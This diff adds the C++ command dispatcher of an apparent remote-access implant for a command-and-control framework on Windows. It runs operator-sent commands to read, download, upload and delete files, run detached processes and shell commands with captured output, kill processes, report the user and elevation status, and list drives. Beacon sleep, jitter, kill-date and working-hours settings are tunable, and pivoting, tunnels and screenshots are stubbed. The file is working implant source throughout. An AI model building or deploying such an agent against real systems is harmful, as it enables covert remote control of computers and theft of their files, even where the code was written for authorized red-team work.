@@ -1,0 +1,826 @@
+#include "Commander.h"
+#include "Agent.h"
+#include "RuntimeCommon.h"
+#include "../protocol/protocol.h"
+
+#include <stdio.h>
+
+#include <string>
+#include <vector>
+
+namespace {
+
+struct GopherScaffoldState {
+    int burstEnabled = 0;
+    int burstSleep = 0;
+    int burstJitter = 0;
+    int chunkSize = 0;
+};
+
+static GopherScaffoldState& scaffoldState()
+{
+    static GopherScaffoldState state;
+    return state;
+}
+
+static std::vector<uint8_t> encodeCommand(uint32_t code, uint32_t id, const gopher_proto::Value* payload)
+{
+    gopher_proto::Command cmd;
+    cmd.code = code;
+    cmd.id = id;
+    if (payload) {
+        gopher_proto::EncodeValue(*payload, &cmd.data);
+    }
+
+    std::vector<uint8_t> encoded;
+    gopher_proto::EncodeCommand(cmd, &encoded);
+    return encoded;
+}
+
+static std::vector<uint8_t> completeResp(uint32_t code, uint32_t id)
+{
+    return encodeCommand(code, id, nullptr);
+}
+
+static std::vector<uint8_t> errResp(uint32_t id, const std::string& msg)
+{
+    gopher_proto::Value payload = gopher_proto::Value::Map();
+    payload.mapValue.push_back(std::make_pair("error", gopher_proto::Value::String(msg)));
+    return encodeCommand(gopher_proto::COMMAND_ERROR, id, &payload);
+}
+
+static std::vector<uint8_t> okResp(uint32_t code, uint32_t id, const gopher_proto::Value& payload)
+{
+    return encodeCommand(code, id, &payload);
+}
+
+static bool decodeParamsMap(const gopher_proto::Command& cmd, gopher_proto::Value* out)
+{
+    if (cmd.data.empty()) {
+        return false;
+    }
+    return gopher_proto::DecodeValue(cmd.data.data(), (uint32_t)cmd.data.size(), out) && out->type == gopher_proto::Value::TYPE_MAP;
+}
+
+static bool getStringField(const gopher_proto::Value& mapValue, const char* key, std::string* out)
+{
+    return gopher_proto::ValueAsString(gopher_proto::MapGet(mapValue, key), out);
+}
+
+static bool getIntField(const gopher_proto::Value& mapValue, const char* key, int32_t* out)
+{
+    return gopher_proto::ValueAsInt32(gopher_proto::MapGet(mapValue, key), out);
+}
+
+static bool getBytesField(const gopher_proto::Value& mapValue, const char* key, std::vector<uint8_t>* out)
+{
+    return gopher_proto::ValueAsBinary(gopher_proto::MapGet(mapValue, key), out);
+}
+
+static bool getStringArrayField(const gopher_proto::Value& mapValue, const char* key, std::vector<std::string>* out)
+{
+    return gopher_proto::ValueAsStringArray(gopher_proto::MapGet(mapValue, key), out);
+}
+
+static std::string quoteArg(const std::string& arg)
+{
+    bool needsQuotes = arg.find_first_of(" \t\"") != std::string::npos;
+    if (!needsQuotes) {
+        return arg;
+    }
+
+    std::string out = "\"";
+    for (size_t i = 0; i < arg.size(); ++i) {
+        if (arg[i] == '\"') {
+            out += '\\';
+        }
+        out += arg[i];
+    }
+    out += '\"';
+    return out;
+}
+
+static std::string joinArgs(const std::vector<std::string>& args)
+{
+    std::string joined;
+    for (size_t i = 0; i < args.size(); ++i) {
+        if (!joined.empty()) {
+            joined += ' ';
+        }
+        joined += quoteArg(args[i]);
+    }
+    return joined;
+}
+
+static bool ensureParentDirectory(const std::string& path)
+{
+    size_t pos = path.find_last_of("\\/");
+    if (pos == std::string::npos) {
+        return true;
+    }
+    return runtime_common::MkdirRecursive(path.substr(0, pos).c_str()) ? true : false;
+}
+
+static bool copyRecursive(const std::string& src, const std::string& dst)
+{
+    DWORD attrs = GetFileAttributesA(src.c_str());
+    if (attrs == INVALID_FILE_ATTRIBUTES) {
+        return false;
+    }
+
+    if (!(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
+        ensureParentDirectory(dst);
+        return CopyFileA(src.c_str(), dst.c_str(), FALSE) ? true : false;
+    }
+
+    if (!runtime_common::MkdirRecursive(dst.c_str())) {
+        return false;
+    }
+
+    char search[MAX_PATH];
+    snprintf(search, sizeof(search), "%s\\*", src.c_str());
+
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA(search, &fd);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+
+    bool ok = true;
+    do {
+        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) {
+            continue;
+        }
+        std::string childSrc = src + "\\" + fd.cFileName;
+        std::string childDst = dst + "\\" + fd.cFileName;
+        if (!copyRecursive(childSrc, childDst)) {
+            ok = false;
+            break;
+        }
+    } while (FindNextFileA(hFind, &fd));
+
+    FindClose(hFind);
+    return ok;
+}
+
+static bool readFileAll(const std::string& path, std::vector<uint8_t>* out)
+{
+    if (!out) {
+        return false;
+    }
+    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+    DWORD size = GetFileSize(hFile, NULL);
+    out->assign(size, 0);
+    DWORD read = 0;
+    BOOL ok = (size == 0) ? TRUE : ReadFile(hFile, out->data(), size, &read, NULL);
+    CloseHandle(hFile);
+    if (!ok) {
+        out->clear();
+        return false;
+    }
+    out->resize(read);
+    return true;
+}
+
+static bool writeFileAll(const std::string& path, const std::vector<uint8_t>& data)
+{
+    if (!ensureParentDirectory(path)) {
+        return false;
+    }
+    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+    DWORD written = 0;
+    BOOL ok = data.empty() ? TRUE : WriteFile(hFile, data.data(), (DWORD)data.size(), &written, NULL);
+    CloseHandle(hFile);
+    return ok && written == data.size();
+}
+
+static std::vector<uint8_t> buildListingBlob(const std::string& path)
+{
+    gopher_proto::Value files = gopher_proto::Value::Array();
+    char search[MAX_PATH];
+    snprintf(search, sizeof(search), "%s\\*", path.c_str());
+
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA(search, &fd);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        return std::vector<uint8_t>();
+    }
+
+    do {
+        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) {
+            continue;
+        }
+
+        ULARGE_INTEGER size;
+        size.HighPart = fd.nFileSizeHigh;
+        size.LowPart = fd.nFileSizeLow;
+
+        FILETIME localFt;
+        FileTimeToLocalFileTime(&fd.ftLastWriteTime, &localFt);
+        ULARGE_INTEGER uli;
+        uli.HighPart = localFt.dwHighDateTime;
+        uli.LowPart = localFt.dwLowDateTime;
+        uint64_t unixTime = 0;
+        if (uli.QuadPart > 116444736000000000ULL) {
+            unixTime = (uli.QuadPart - 116444736000000000ULL) / 10000000ULL;
+        }
+
+        gopher_proto::Value entry = gopher_proto::Value::Map();
+        entry.mapValue.push_back(std::make_pair("mode", gopher_proto::Value::String((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "drwxr-xr-x" : "-rw-r--r--")));
+        entry.mapValue.push_back(std::make_pair("nlink", gopher_proto::Value::Int(1)));
+        entry.mapValue.push_back(std::make_pair("user", gopher_proto::Value::String("")));
+        entry.mapValue.push_back(std::make_pair("group", gopher_proto::Value::String("")));
+        entry.mapValue.push_back(std::make_pair("size", gopher_proto::Value::Int((int64_t)size.QuadPart)));
+        entry.mapValue.push_back(std::make_pair("date", gopher_proto::Value::String(std::to_string(unixTime))));
+        entry.mapValue.push_back(std::make_pair("filename", gopher_proto::Value::String(fd.cFileName)));
+        entry.mapValue.push_back(std::make_pair("is_dir", gopher_proto::Value::Bool((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)));
+        files.arrayValue.push_back(entry);
+    } while (FindNextFileA(hFind, &fd));
+
+    FindClose(hFind);
+
+    std::vector<uint8_t> out;
+    gopher_proto::EncodeValue(files, &out);
+    return out;
+}
+
+static std::vector<uint8_t> buildDrivesBlob()
+{
+    gopher_proto::Value drives = gopher_proto::Value::Array();
+    char root[] = "A:\\";
+    for (char letter = 'A'; letter <= 'Z'; ++letter) {
+        root[0] = letter;
+        UINT type = GetDriveTypeA(root);
+        if (type == DRIVE_NO_ROOT_DIR) {
+            continue;
+        }
+        std::string kind = "unknown";
+        switch (type) {
+        case DRIVE_FIXED: kind = "fixed"; break;
+        case DRIVE_REMOTE: kind = "remote"; break;
+        case DRIVE_REMOVABLE: kind = "removable"; break;
+        case DRIVE_CDROM: kind = "cdrom"; break;
+        case DRIVE_RAMDISK: kind = "ramdisk"; break;
+        }
+        gopher_proto::Value entry = gopher_proto::Value::Map();
+        entry.mapValue.push_back(std::make_pair("name", gopher_proto::Value::String(root)));
+        entry.mapValue.push_back(std::make_pair("type", gopher_proto::Value::String(kind)));
+        drives.arrayValue.push_back(entry);
+    }
+
+    std::vector<uint8_t> out;
+    gopher_proto::EncodeValue(drives, &out);
+    return out;
+}
+
+static bool parseWorkingTime(const std::string& value, int* start, int* end)
+{
+    if (!start || !end) {
+        return false;
+    }
+    size_t dash = value.find('-');
+    if (dash == std::string::npos) {
+        return false;
+    }
+    std::string a = value.substr(0, dash);
+    std::string b = value.substr(dash + 1);
+    int ah = 0, am = 0, bh = 0, bm = 0;
+    if (sscanf(a.c_str(), "%d:%d", &ah, &am) != 2 || sscanf(b.c_str(), "%d:%d", &bh, &bm) != 2) {
+        return false;
+    }
+    if (ah < 0 || ah > 23 || bh < 0 || bh > 23 || am < 0 || am > 59 || bm < 0 || bm > 59) {
+        return false;
+    }
+    *start = ah * 100 + am;
+    *end = bh * 100 + bm;
+    return true;
+}
+
+static std::string formatWorkingTime(int start, int end)
+{
+    char buf[32];
+    snprintf(buf, sizeof(buf), "%02d:%02d-%02d:%02d", start / 100, start % 100, end / 100, end % 100);
+    return std::string(buf);
+}
+
+} // namespace
+
+Commander::Commander(Agent* a)
+{
+    agent = a;
+}
+
+Commander::~Commander()
+{
+}
+
+void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, BYTE* outBuf, ULONG* outSize)
+{
+    if (outSize) {
+        *outSize = 0;
+    }
+    if (!recv || recvSize == 0 || !outBuf || !outSize) {
+        return;
+    }
+
+    gopher_proto::Message message;
+    if (!gopher_proto::DecodeMessage(recv, recvSize, &message) || message.type != 1) {
+        return;
+    }
+
+    std::vector<std::vector<uint8_t> > responses;
+
+    for (size_t i = 0; i < message.object.size(); ++i) {
+        gopher_proto::Command cmd;
+        if (!gopher_proto::DecodeCommand(message.object[i].data(), (uint32_t)message.object[i].size(), &cmd)) {
+            continue;
+        }
+
+        switch (cmd.code) {
+        case gopher_proto::COMMAND_EXIT:
+            ExitProcess(0);
+            break;
+
+        case gopher_proto::COMMAND_TERMINATE:
+            agent->active = FALSE;
+            responses.push_back(completeResp(gopher_proto::COMMAND_TERMINATE, cmd.id));
+            break;
+
+        case gopher_proto::COMMAND_PWD: {
+            char cwd[MAX_PATH] = {0};
+            DWORD len = GetCurrentDirectoryA(MAX_PATH, cwd);
+            if (len == 0) {
+                responses.push_back(errResp(cmd.id, "failed to query current directory"));
+            } else {
+                gopher_proto::Value payload = gopher_proto::Value::Map();
+                payload.mapValue.push_back(std::make_pair("path", gopher_proto::Value::String(cwd)));
+                responses.push_back(okResp(gopher_proto::COMMAND_PWD, cmd.id, payload));
+            }
+            break;
+        }
+
+        case gopher_proto::COMMAND_CD: {
+            gopher_proto::Value params;
+            std::string path;
+            if (!decodeParamsMap(cmd, &params) || !getStringField(params, "path", &path)) {
+                responses.push_back(errResp(cmd.id, "invalid cd parameters"));
+                break;
+            }
+            if (!SetCurrentDirectoryA(path.c_str())) {
+                responses.push_back(errResp(cmd.id, "change directory failed"));
+            } else {
+                responses.push_back(completeResp(gopher_proto::COMMAND_CD, cmd.id));
+            }
+            break;
+        }
+
+        case gopher_proto::COMMAND_MKDIR: {
+            gopher_proto::Value params;
+            std::string path;
+            if (!decodeParamsMap(cmd, &params) || !getStringField(params, "path", &path)) {
+                responses.push_back(errResp(cmd.id, "invalid mkdir parameters"));
+                break;
+            }
+            if (!runtime_common::MkdirRecursive(path.c_str())) {
+                responses.push_back(errResp(cmd.id, "mkdir failed"));
+            } else {
+                responses.push_back(completeResp(gopher_proto::COMMAND_MKDIR, cmd.id));
+            }
+            break;
+        }
+
+        case gopher_proto::COMMAND_RM: {
+            gopher_proto::Value params;
+            std::string path;
+            if (!decodeParamsMap(cmd, &params) || !getStringField(params, "path", &path)) {
+                responses.push_back(errResp(cmd.id, "invalid rm parameters"));
+                break;
+            }
+            if (!runtime_common::RemoveRecursive(path.c_str())) {
+                responses.push_back(errResp(cmd.id, "remove failed"));
+            } else {
+                responses.push_back(completeResp(gopher_proto::COMMAND_RM, cmd.id));
+            }
+            break;
+        }
+
+        case gopher_proto::COMMAND_MV: {
+            gopher_proto::Value params;
+            std::string src;
+            std::string dst;
+            if (!decodeParamsMap(cmd, &params) || !getStringField(params, "src", &src) || !getStringField(params, "dst", &dst)) {
+                responses.push_back(errResp(cmd.id, "invalid move parameters"));
+                break;
+            }
+            if (!MoveFileA(src.c_str(), dst.c_str())) {
+                responses.push_back(errResp(cmd.id, "move failed"));
+            } else {
+                responses.push_back(completeResp(gopher_proto::COMMAND_MV, cmd.id));
+            }
+            break;
+        }
+
+        case gopher_proto::COMMAND_CP: {
+            gopher_proto::Value params;
+            std::string src;
+            std::string dst;
+            if (!decodeParamsMap(cmd, &params) || !getStringField(params, "src", &src) || !getStringField(params, "dst", &dst)) {
+                responses.push_back(errResp(cmd.id, "invalid copy parameters"));
+                break;
+            }
+            if (!copyRecursive(src, dst)) {
+                responses.push_back(errResp(cmd.id, "copy failed"));
+            } else {
+                responses.push_back(completeResp(gopher_proto::COMMAND_CP, cmd.id));
+            }
+            break;
+        }
+
+        case gopher_proto::COMMAND_CAT: {
+            gopher_proto::Value params;
+            std::string path;
+            std::vector<uint8_t> content;
+            if (!decodeParamsMap(cmd, &params) || !getStringField(params, "path", &path)) {
+                responses.push_back(errResp(cmd.id, "invalid cat parameters"));
+                break;
+            }
+            if (!readFileAll(path, &content)) {
+                responses.push_back(errResp(cmd.id, "read failed"));
+            } else {
+                gopher_proto::Value payload = gopher_proto::Value::Map();
+                payload.mapValue.push_back(std::make_pair("path", gopher_proto::Value::String(path)));
+                payload.mapValue.push_back(std::make_pair("content", gopher_proto::Value::Binary(content)));
+                responses.push_back(okResp(gopher_proto::COMMAND_CAT, cmd.id, payload));
+            }
+            break;
+        }
+
+        case gopher_proto::COMMAND_UPLOAD: {
+            gopher_proto::Value params;
+            std::string path;
+            std::vector<uint8_t> content;
+            if (!decodeParamsMap(cmd, &params) || !getStringField(params, "path", &path) || !getBytesField(params, "content", &content)) {
+                responses.push_back(errResp(cmd.id, "invalid upload parameters"));
+                break;
+            }
+            if (!writeFileAll(path, content)) {
+                responses.push_back(errResp(cmd.id, "write failed"));
+            } else {
+                gopher_proto::Value payload = gopher_proto::Value::Map();
+                payload.mapValue.push_back(std::make_pair("path", gopher_proto::Value::String(path)));
+                responses.push_back(okResp(gopher_proto::COMMAND_UPLOAD, cmd.id, payload));
+            }
+            break;
+        }
+
+        case gopher_proto::COMMAND_DOWNLOAD: {
+            gopher_proto::Value params;
+            std::string path;
+            std::vector<uint8_t> content;
+            if (!decodeParamsMap(cmd, &params) || !getStringField(params, "path", &path)) {
+                responses.push_back(errResp(cmd.id, "invalid download parameters"));
+                break;
+            }
+            if (!readFileAll(path, &content)) {
+                responses.push_back(errResp(cmd.id, "download failed"));
+            } else {
+                gopher_proto::Value payload = gopher_proto::Value::Map();
+                payload.mapValue.push_back(std::make_pair("id", gopher_proto::Value::Int(0)));
+                payload.mapValue.push_back(std::make_pair("path", gopher_proto::Value::String(path)));
+                payload.mapValue.push_back(std::make_pair("size", gopher_proto::Value::Int((int64_t)content.size())));
+                payload.mapValue.push_back(std::make_pair("content", gopher_proto::Value::Binary(content)));
+                payload.mapValue.push_back(std::make_pair("start", gopher_proto::Value::Bool(true)));
+                payload.mapValue.push_back(std::make_pair("finish", gopher_proto::Value::Bool(true)));
+                payload.mapValue.push_back(std::make_pair("canceled", gopher_proto::Value::Bool(false)));
+                responses.push_back(okResp(gopher_proto::COMMAND_DOWNLOAD, cmd.id, payload));
+            }
+            break;
+        }
+
+        case gopher_proto::COMMAND_LS: {
+            gopher_proto::Value params;
+            std::string path;
+            if (!decodeParamsMap(cmd, &params) || !getStringField(params, "path", &path)) {
+                responses.push_back(errResp(cmd.id, "invalid ls parameters"));
+                break;
+            }
+            std::vector<uint8_t> blob = buildListingBlob(path);
+            if (blob.empty() && GetLastError() != ERROR_SUCCESS) {
+                responses.push_back(errResp(cmd.id, "listing failed"));
+            } else {
+                gopher_proto::Value payload = gopher_proto::Value::Map();
+                payload.mapValue.push_back(std::make_pair("result", gopher_proto::Value::Bool(true)));
+                payload.mapValue.push_back(std::make_pair("status", gopher_proto::Value::String("")));
+                payload.mapValue.push_back(std::make_pair("path", gopher_proto::Value::String(path)));
+                payload.mapValue.push_back(std::make_pair("files", gopher_proto::Value::Binary(blob)));
+                responses.push_back(okResp(gopher_proto::COMMAND_LS, cmd.id, payload));
+            }
+            break;
+        }
+
+        case gopher_proto::COMMAND_RUN: {
+            gopher_proto::Value params;
+            std::string program;
+            std::vector<std::string> args;
+            if (!decodeParamsMap(cmd, &params) || !getStringField(params, "program", &program) || !getStringArrayField(params, "args", &args)) {
+                responses.push_back(errResp(cmd.id, "invalid run parameters"));
+                break;
+            }
+            DWORD pid = 0;
+            std::string joined = joinArgs(args);
+            if (!runtime_common::RunDetachedProcess(program.c_str(), joined.c_str(), &pid)) {
+                responses.push_back(errResp(cmd.id, "run failed"));
+            } else {
+                gopher_proto::Value payload = gopher_proto::Value::Map();
+                payload.mapValue.push_back(std::make_pair("stdout", gopher_proto::Value::String("")));
+                payload.mapValue.push_back(std::make_pair("stderr", gopher_proto::Value::String("")));
+                payload.mapValue.push_back(std::make_pair("pid", gopher_proto::Value::Int((int64_t)pid)));
+                payload.mapValue.push_back(std::make_pair("start", gopher_proto::Value::Bool(true)));
+                payload.mapValue.push_back(std::make_pair("finish", gopher_proto::Value::Bool(true)));
+                responses.push_back(okResp(gopher_proto::COMMAND_RUN, cmd.id, payload));
+            }
+            break;
+        }
+
+        case gopher_proto::COMMAND_SHELL: {
+            gopher_proto::Value params;
+            std::string program;
+            std::vector<std::string> args;
+            if (!decodeParamsMap(cmd, &params) || !getStringField(params, "program", &program) || !getStringArrayField(params, "args", &args)) {
+                responses.push_back(errResp(cmd.id, "invalid shell parameters"));
+                break;
+            }
+            std::string output;
+            std::string cmdLine = quoteArg(program);
+            std::string joined = joinArgs(args);
+            if (!joined.empty()) {
+                cmdLine += " ";
+                cmdLine += joined;
+            }
+            if (!runtime_common::RunShellCapture(cmdLine.c_str(), &output)) {
+                responses.push_back(errResp(cmd.id, "shell execution failed"));
+            } else {
+                gopher_proto::Value payload = gopher_proto::Value::Map();
+                payload.mapValue.push_back(std::make_pair("output", gopher_proto::Value::String(output)));
+                responses.push_back(okResp(gopher_proto::COMMAND_SHELL, cmd.id, payload));
+            }
+            break;
+        }
+
+        case gopher_proto::COMMAND_KILL: {
+            gopher_proto::Value params;
+            int32_t pid = 0;
+            if (!decodeParamsMap(cmd, &params) || !getIntField(params, "pid", &pid)) {
+                responses.push_back(errResp(cmd.id, "invalid kill parameters"));
+                break;
+            }
+            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, (DWORD)pid);
+            if (!hProc || !TerminateProcess(hProc, 1)) {
+                if (hProc) {
+                    CloseHandle(hProc);
+                }
+                responses.push_back(errResp(cmd.id, "process termination failed"));
+            } else {
+                CloseHandle(hProc);
+                responses.push_back(completeResp(gopher_proto::COMMAND_KILL, cmd.id));
+            }
+            break;
+        }
+
+        case gopher_proto::COMMAND_SLEEP: {
+            gopher_proto::Value params;
+            int32_t sleep = 0;
+            int32_t jitter = 0;
+            if (!decodeParamsMap(cmd, &params) || !getIntField(params, "sleep", &sleep) || !getIntField(params, "jitter", &jitter)) {
+                responses.push_back(errResp(cmd.id, "invalid sleep parameters"));
+                break;
+            }
+            agent->sleepMs = (sleep > 0 ? (ULONG)sleep : 0UL) * 1000UL;
+            agent->jitter = jitter > 0 ? (ULONG)jitter : 0UL;
+            gopher_proto::Value payload = gopher_proto::Value::Map();
+            payload.mapValue.push_back(std::make_pair("sleep", gopher_proto::Value::Int(sleep)));
+            payload.mapValue.push_back(std::make_pair("jitter", gopher_proto::Value::Int(jitter)));
+            responses.push_back(okResp(gopher_proto::COMMAND_SLEEP, cmd.id, payload));
+            break;
+        }
+
+        case gopher_proto::COMMAND_PROFILE: {
+            gopher_proto::Value params;
+            int32_t subcmd = 0;
+            int32_t intValue = 0;
+            std::string strValue;
+            if (!decodeParamsMap(cmd, &params) || !getIntField(params, "subcmd", &subcmd)) {
+                responses.push_back(errResp(cmd.id, "invalid profile parameters"));
+                break;
+            }
+            getIntField(params, "int_value", &intValue);
+            getStringField(params, "str_value", &strValue);
+
+            gopher_proto::Value payload = gopher_proto::Value::Map();
+            payload.mapValue.push_back(std::make_pair("subcmd", gopher_proto::Value::Int(subcmd)));
+
+            if (subcmd == 2) {
+                scaffoldState().chunkSize = intValue;
+            } else if (subcmd == 3) {
+                agent->killDate = intValue;
+            } else if (subcmd == 4) {
+                int start = 0;
+                int end = 0;
+                if (!parseWorkingTime(strValue, &start, &end)) {
+                    responses.push_back(errResp(cmd.id, "invalid working time"));
+                    break;
+                }
+                agent->workStart = start;
+                agent->workEnd = end;
+                strValue = formatWorkingTime(start, end);
+            } else {
+                responses.push_back(errResp(cmd.id, "unsupported profile subcmd"));
+                break;
+            }
+
+            payload.mapValue.push_back(std::make_pair("int_value", gopher_proto::Value::Int(intValue)));
+            payload.mapValue.push_back(std::make_pair("str_value", gopher_proto::Value::String(strValue)));
+            responses.push_back(okResp(gopher_proto::COMMAND_PROFILE, cmd.id, payload));
+            break;
+        }
+
+        case gopher_proto::COMMAND_BURST: {
+            gopher_proto::Value params;
+            int32_t subcmd = 0;
+            int32_t enabled = 0;
+            int32_t sleep = 0;
+            int32_t jitter = 0;
+            if (!decodeParamsMap(cmd, &params) || !getIntField(params, "subcmd", &subcmd)) {
+                responses.push_back(errResp(cmd.id, "invalid burst parameters"));
+                break;
+            }
+            getIntField(params, "enabled", &enabled);
+            getIntField(params, "sleep", &sleep);
+            getIntField(params, "jitter", &jitter);
+
+            if (subcmd == 2) {
+                scaffoldState().burstEnabled = enabled;
+                scaffoldState().burstSleep = sleep;
+                scaffoldState().burstJitter = jitter;
+            } else if (subcmd != 1) {
+                responses.push_back(errResp(cmd.id, "unsupported burst subcmd"));
+                break;
+            }
+
+            gopher_proto::Value payload = gopher_proto::Value::Map();
+            payload.mapValue.push_back(std::make_pair("enabled", gopher_proto::Value::Int(scaffoldState().burstEnabled)));
+            payload.mapValue.push_back(std::make_pair("sleep", gopher_proto::Value::Int(scaffoldState().burstSleep)));
+            payload.mapValue.push_back(std::make_pair("jitter", gopher_proto::Value::Int(scaffoldState().burstJitter)));
+            responses.push_back(okResp(gopher_proto::COMMAND_BURST, cmd.id, payload));
+            break;
+        }
+
+        case gopher_proto::COMMAND_GETUID: {
+            char username[256] = {0};
+            DWORD usernameLen = sizeof(username);
+            GetUserNameA(username, &usernameLen);
+            char domain[256] = {0};
+            GetEnvironmentVariableA("USERDOMAIN", domain, sizeof(domain));
+
+            gopher_proto::Value payload = gopher_proto::Value::Map();
+            payload.mapValue.push_back(std::make_pair("username", gopher_proto::Value::String(username)));
+            payload.mapValue.push_back(std::make_pair("domain", gopher_proto::Value::String(domain)));
+            payload.mapValue.push_back(std::make_pair("elevated", gopher_proto::Value::Bool(runtime_common::IsProcessElevated() ? true : false)));
+            responses.push_back(okResp(gopher_proto::COMMAND_GETUID, cmd.id, payload));
+            break;
+        }
+
+        case gopher_proto::COMMAND_DISKS: {
+            std::vector<uint8_t> drives = buildDrivesBlob();
+            gopher_proto::Value payload = gopher_proto::Value::Map();
+            payload.mapValue.push_back(std::make_pair("drives", gopher_proto::Value::Binary(drives)));
+            responses.push_back(okResp(gopher_proto::COMMAND_DISKS, cmd.id, payload));
+            break;
+        }
+
+        case gopher_proto::COMMAND_JOB_LIST: {
+            gopher_proto::Value list = gopher_proto::Value::Array();
+            std::vector<uint8_t> blob;
+            gopher_proto::EncodeValue(list, &blob);
+            gopher_proto::Value payload = gopher_proto::Value::Map();
+            payload.mapValue.push_back(std::make_pair("list", gopher_proto::Value::Binary(blob)));
+            responses.push_back(okResp(gopher_proto::COMMAND_JOB_LIST, cmd.id, payload));
+            break;
+        }
+
+        case gopher_proto::COMMAND_JOB_KILL:
+            responses.push_back(completeResp(gopher_proto::COMMAND_JOB_KILL, cmd.id));
+            break;
+
+        case gopher_proto::COMMAND_REV2SELF:
+            responses.push_back(completeResp(gopher_proto::COMMAND_REV2SELF, cmd.id));
+            break;
+
+        case gopher_proto::COMMAND_LINK:
+            responses.push_back(errResp(cmd.id, "pivot link requires a transport extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_UNLINK:
+            responses.push_back(errResp(cmd.id, "pivot unlink requires a transport extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_PIVOT_EXEC:
+            responses.push_back(errResp(cmd.id, "pivot data routing requires a transport extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_TUNNEL_START:
+            responses.push_back(errResp(cmd.id, "tunnel start requires a transport extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_TUNNEL_STOP:
+            responses.push_back(errResp(cmd.id, "tunnel stop requires a transport extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_TUNNEL_PAUSE:
+            responses.push_back(errResp(cmd.id, "tunnel pause requires a transport extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_TUNNEL_RESUME:
+            responses.push_back(errResp(cmd.id, "tunnel resume requires a transport extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_TUNNEL_REVERSE:
+            responses.push_back(errResp(cmd.id, "reverse tunnel requires a transport extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_LPORTFWD_START:
+            responses.push_back(errResp(cmd.id, "local port forwarding requires a transport extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_LPORTFWD_STOP:
+            responses.push_back(errResp(cmd.id, "local port forwarding requires a transport extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_RPORTFWD_START:
+            responses.push_back(errResp(cmd.id, "reverse port forwarding requires a transport extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_RPORTFWD_STOP:
+            responses.push_back(errResp(cmd.id, "reverse port forwarding requires a transport extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_TERMINAL_START:
+            responses.push_back(errResp(cmd.id, "interactive terminal requires a platform extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_TERMINAL_STOP:
+            responses.push_back(errResp(cmd.id, "interactive terminal requires a platform extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_PS:
+            responses.push_back(errResp(cmd.id, "process enumeration requires a platform extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_SCREENSHOT:
+            responses.push_back(errResp(cmd.id, "screen capture requires a platform extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_ZIP:
+            responses.push_back(errResp(cmd.id, "archive creation requires a platform extension in this scaffold"));
+            break;
+        case gopher_proto::COMMAND_EXEC_BOF:
+        case gopher_proto::COMMAND_EXEC_BOF_ASYNC:
+            responses.push_back(errResp(cmd.id, "BOF execution requires a native loader extension"));
+            break;
+
+        default:
+            responses.push_back(errResp(cmd.id, "unknown command code"));
+            break;
+        }
+    }
+
+    if (responses.empty()) {
+        return;
+    }
+
+    gopher_proto::Message outMessage;
+    outMessage.type = 1;
+    outMessage.object = responses;
+
+    std::vector<uint8_t> packed;
+    if (!gopher_proto::EncodeMessage(outMessage, &packed)) {
+        return;
+    }
+
+    memcpy(outBuf, packed.data(), packed.size());
+    *outSize = (ULONG)packed.size();
+}
+
+void Commander::CmdTerminate(ULONG c, BYTE* d, ULONG s)       { (void)c; (void)d; (void)s; }
+void Commander::CmdFsList(ULONG c, BYTE* d, ULONG s)          { (void)c; (void)d; (void)s; }
+void Commander::CmdFsUpload(ULONG c, BYTE* d, ULONG s)        { (void)c; (void)d; (void)s; }
+void Commander::CmdFsDownload(ULONG c, BYTE* d, ULONG s)      { (void)c; (void)d; (void)s; }
+void Commander::CmdFsRemove(ULONG c, BYTE* d, ULONG s)        { (void)c; (void)d; (void)s; }
+void Commander::CmdFsMkdirs(ULONG c, BYTE* d, ULONG s)        { (void)c; (void)d; (void)s; }
+void Commander::CmdFsCopy(ULONG c, BYTE* d, ULONG s)          { (void)c; (void)d; (void)s; }
+void Commander::CmdFsMove(ULONG c, BYTE* d, ULONG s)          { (void)c; (void)d; (void)s; }
+void Commander::CmdFsCd(ULONG c, BYTE* d, ULONG s)            { (void)c; (void)d; (void)s; }
+void Commander::CmdFsPwd(ULONG c, BYTE* d, ULONG s)           { (void)c; (void)d; (void)s; }
+void Commander::CmdFsCat(ULONG c, BYTE* d, ULONG s)           { (void)c; (void)d; (void)s; }
+void Commander::CmdOsRun(ULONG c, BYTE* d, ULONG s)           { (void)c; (void)d; (void)s; }
+void Commander::CmdOsInfo(ULONG c, BYTE* d, ULONG s)          { (void)c; (void)d; (void)s; }
+void Commander::CmdOsPs(ULONG c, BYTE* d, ULONG s)            { (void)c; (void)d; (void)s; }
+void Commander::CmdOsScreenshot(ULONG c, BYTE* d, ULONG s)    { (void)c; (void)d; (void)s; }
+void Commander::CmdOsShell(ULONG c, BYTE* d, ULONG s)         { (void)c; (void)d; (void)s; }
+void Commander::CmdOsKill(ULONG c, BYTE* d, ULONG s)          { (void)c; (void)d; (void)s; }
